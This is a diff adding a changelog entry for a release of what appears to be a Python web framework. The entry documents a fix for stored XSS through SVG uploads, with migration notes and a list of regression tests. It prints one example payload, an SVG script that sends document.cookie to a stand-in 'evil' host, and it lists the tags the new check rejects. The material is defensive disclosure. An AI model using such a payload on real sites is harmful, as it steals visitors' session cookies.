@@ -4,6 +4,38 @@ All notable changes to Nori are documented here. Format follows [Keep a Changelo
 
 ---
 
+## [1.34.0] — 2026-04-30
+
+### Fixed (BREAKING — security)
+
+- **SVG uploads were a stored-XSS hole on every project that called ``save_upload(file)`` without specifying ``allowed_types`` (HIGH).** Three things lined up to make this dangerous: (1) ``_MIME_MAP`` listed ``'svg' → 'image/svg+xml'`` so SVG was in the default allowlist; (2) ``_MAGIC_BYTES`` had no SVG entry, so ``_validate_magic_bytes`` followed its "unknown signature → skip gracefully" branch; (3) the existing test ``test_magic_bytes_unknown_extension_skipped`` codified the skip as intentional. The result: a payload named ``cute_cat.svg`` with ``Content-Type: image/svg+xml`` and body ``<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//evil/?'+document.cookie)</script></svg>`` passed every validation layer the framework advertised. When the project rendered the upload inline (``<object>``, ``<embed>``, or a direct link served with ``image/svg+xml``), the script ran in the host page's origin — stored XSS with the visitor's session cookie. Three changes close the gap: **(a)** SVG is removed from the default ``allowed_types`` and excluded via a new ``_UNSAFE_BY_DEFAULT`` set, so a forgotten ``allowed_types`` argument can no longer silently inherit the surface; **(b)** ``_MAGIC_BYTES['svg'] = (b'<?xml', b'<svg')`` so opt-in projects still get a prefix sanity check (an attacker can supply ``<?xml`` and bury ``<script>`` further down — this is intentionally a sanity guard, not the substantive defence); **(c)** new ``_validate_svg_content`` scans up to 256 KB of an opted-in SVG and rejects any presence of ``<script>``, ``<foreignObject>``, ``<iframe>``, ``<embed>``, ``<object>``, or ``on*`` event handler attributes. The scan is **reject, not sanitise** — sanitising arbitrary XML is a known unsolved problem (mXSS bypasses against DOMPurify and bleach are well-documented), and a half-cleaned SVG is a worse outcome than a denied upload.
+
+### BREAKING migration notes
+
+- Projects that called ``save_upload(file)`` with no ``allowed_types`` AND relied on accepting SVG uploads will start receiving ``UploadError("Extension '.svg' not allowed.")``. The fix is one line: pass ``allowed_types=['svg', 'png', 'jpg', ...]`` explicitly. The opt-in path additionally enforces the content scan above; projects that legitimately need to accept user SVGs should also read the new "SVG: opt-in with content scan" section in ``docs/security.md`` for guidance on serving uploads as ``text/plain`` or hosting on a separate origin.
+- Projects that never accepted SVG uploads (the typical case) need no migration. The default behaviour remains: JPEG, PNG, GIF, PDF, WebP. Extension validation now refuses ``.svg`` rather than silently accepting it.
+
+### Tests
+
+993 → 1006 passing. 13 new regression tests:
+- ``test_default_allowed_types_excludes_svg`` — pinned: ``svg`` cannot leak back into the default allowlist
+- ``test_svg_magic_bytes_accept_xml_prefix`` / ``..._svg_prefix`` — both legitimate prefixes pass the magic-byte check
+- ``test_svg_magic_bytes_reject_non_svg`` — a file claiming ``.svg`` but starting with ``<html>`` is rejected at the magic-byte layer
+- ``test_svg_content_rejects_script_tag`` — the canonical XSS vector
+- ``test_svg_content_rejects_foreign_object`` — pure ``<foreignObject>`` is enough to reject (rejecting the tag, not relying on enumerating its inner content)
+- ``test_svg_content_rejects_iframe`` — embedded ``<iframe>`` rejected
+- ``test_svg_content_rejects_event_handler`` / ``..._mixed_case`` — ``onload``, ``OnLoad`` both caught (case-insensitive)
+- ``test_svg_content_accepts_clean_svg`` — well-formed icons / diagrams still pass
+- ``test_save_upload_default_rejects_svg_extension`` — end-to-end: default ``allowed_types`` refuses SVG
+- ``test_save_upload_svg_xss_blocked_when_opted_in`` — end-to-end: even with opt-in, ``<script>`` is rejected before disk
+- ``test_save_upload_clean_svg_accepted_when_opted_in`` — end-to-end: clean SVG still works
+
+### Documentation
+
+- ``docs/security.md`` "Upload Security" section gains an "SVG: opt-in with content scan" subsection: threat model, opt-in usage, the rejected vectors table, and the operational guidance to either sanitise server-side, serve as ``text/plain``, or host on a separate origin. The pre-1.34 line about SVG/CSV "skipped gracefully" is replaced — only CSV / TXT skip now; SVG is documented as a load-bearing opt-in.
+
+---
+
 ## [1.33.1] — 2026-04-30
 
 ### Improved
